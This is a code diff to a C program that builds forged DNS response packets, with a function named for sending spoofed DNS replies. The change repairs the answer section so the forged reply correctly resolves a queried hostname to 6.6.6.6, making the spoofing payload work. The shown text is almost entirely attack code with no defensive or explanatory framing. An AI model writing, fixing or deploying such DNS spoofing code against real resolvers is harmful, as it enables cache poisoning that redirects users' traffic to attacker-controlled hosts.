@@ -161,10 +161,10 @@ int build_dns_payload(uint8_t *buffer, const char *hostname, uint16_t txid, uint
 
     // DNS Header (12 bytes)
     uint16_t flags = htons(0x8180); // Standard response 
-    uint16_t q_count = htons(1);   // Number of questions
-    uint16_t ans_count = htons(1);        // Number of answer RRs
-    uint16_t auth_count = 0;       // Number of authority RRs
-    uint16_t add_count = 0;        // Number of additional RRs
+    uint16_t q_count = htons(1);   // One question
+    uint16_t ans_count = htons(1); // One answer
+    uint16_t auth_count = 0;       // No authority records
+    uint16_t add_count = 0;        // No additional records
 
     *(uint16_t *)ptr = htons(txid); // Transaction ID
     ptr += 2;
@@ -179,30 +179,30 @@ int build_dns_payload(uint8_t *buffer, const char *hostname, uint16_t txid, uint
     *(uint16_t *)ptr = add_count;   // Additional RRs
     ptr += 2;
 
-    // DNS Question Section
-    encode_domain_name(ptr, hostname); // Encode the query name
+    // Encode the domain name for the question section
+    encode_domain_name(ptr, hostname);
     ptr += strlen((const char *)ptr) + 1;
 
-    *(uint16_t *)ptr = htons(qtype);  // Query type (e.g., A = 1, AAAA = 28, MX = 15)
+    *(uint16_t *)ptr = htons(qtype); // Query type (A = 1)
     ptr += 2;
-    *(uint16_t *)ptr = htons(1);      // Query class (IN = 1 for internet)
+    *(uint16_t *)ptr = htons(1);     // Query class (IN = 1)
     ptr += 2;
 
     // DNS Answer Section
-    unsigned char *answer = (unsigned char *)(ptr + 1);
-    *(uint16_t *)answer = htons(0xc00c); // Pointer to the name (offset 0x0c)
-    answer += 2;
-    *(uint16_t *)answer = htons(1);      // Type A
-    answer += 2;
-    *(uint16_t *)answer = htons(1);      // Class IN
-    answer += 2;
-    *(uint32_t *)answer = htonl(300);    // TTL (300 seconds)
-    answer += 4;
-    *(uint16_t *)answer = htons(4);      // Data length (4 bytes for IPv4)
-    answer += 2;
-    *(uint32_t *)answer = inet_addr("6.6.6.6"); // Resolved IP address
+    *(uint16_t *)ptr = htons(0xc00c); // Pointer to the domain name (fixing the malformed pointer)
+    ptr += 2;
+    *(uint16_t *)ptr = htons(1);      // Type A
+    ptr += 2;
+    *(uint16_t *)ptr = htons(1);      // Class IN
+    ptr += 2;
+    *(uint32_t *)ptr = htonl(300);    // TTL (300 seconds)
+    ptr += 4;
+    *(uint16_t *)ptr = htons(4);      // Data length (IPv4 = 4 bytes)
+    ptr += 2;
+    *(uint32_t *)ptr = inet_addr("6.6.6.6"); // Resolved IP address
+    ptr += 4;
 
-    return answer - buffer; // Return the size of the payload
+    return ptr - buffer; // Return the total size of the DNS payload
 }
 
 int full_send_spoofed_dns(uint txid, uint source_port) {
